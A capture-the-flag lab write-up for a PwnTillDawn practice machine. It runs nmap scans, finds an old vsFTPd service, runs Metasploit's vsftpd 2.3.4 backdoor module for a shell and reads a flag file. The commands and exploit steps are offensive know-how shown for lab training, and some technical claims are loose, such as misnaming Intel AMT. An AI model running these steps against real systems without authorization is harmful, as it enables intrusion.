PwnTillDawn 10.150.150.12

First we need to scan the entire subnetwork to get the reachable ip address by using ping scan because it is lightweight.

```bash
sudo nmap -sn 10.150.150.0/24
```

![gambar1](img/gambar1.png)


Next, we begin by enumerating the open ports on the target machine using a standard Nmap scan. At this stage, it’s useful to also perform service version detection and run common scripts to gather more detailed information about the target.

-sC (Default Scripts)
Runs a set of default NSE (Nmap Scripting Engine) scripts
Helps identify:
Misconfigurations
Basic vulnerabilities
Service information

-sV (Service Version Detection)
Attempts to determine:
Service type (e.g., Apache, vsftpd)
Version number

-Pn (No Ping)
Skips host discovery (no ICMP ping)
Treats the target as alive

```bash
nmap -sC -sV -Pn 10.150.150.12
```
![gambar2](img/gambar2.png)

The nmap scan shows us that we have ports 21 (FTP server), 22 (SSH) and 16992 (Intel Archive Management Technology) open.
The open port 21 is running vsFTPd 2.0.8, and looks like it allows Anonymous login with user ‘ftp’.
A quick google search of the vsftpd 2.0.8 server shows that it is infact quite outdated. Older version such as 2.3.4 seem to have a backdoor which lets a user perform RCE exploits (CVE-2011–2523). So it is likely that these existing exploits also work on this version. Let us check metasploit if we find something.

![gambar3](img/gambar3.png)

```bash
msfconsole
```

```bash
search vsftpd
```

As expected, we get a hit on an exploit for the vsftpd 2.3.4 backdoor. Use it by selecting the exploit and setting the RHOST to poral (10.150.150.12) by using ‘show options’, and run the exploit.

```bash
set RHOSTS 10.150.150.12
```

![gambar4](img/gambar4.png)

and then we run the backdoor

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

![gambar5](img/gambar5.png)

And then we will be shown that we got a shell session, we can check using id command

![gambar7](img/gambar7.png)

```bash
id
ls
cat FLAG1.txt
```

Last but not least we will got the FLAG1.txt file, we can use cat command to see what is inside.
and then we will be shown code/flag for this machine.

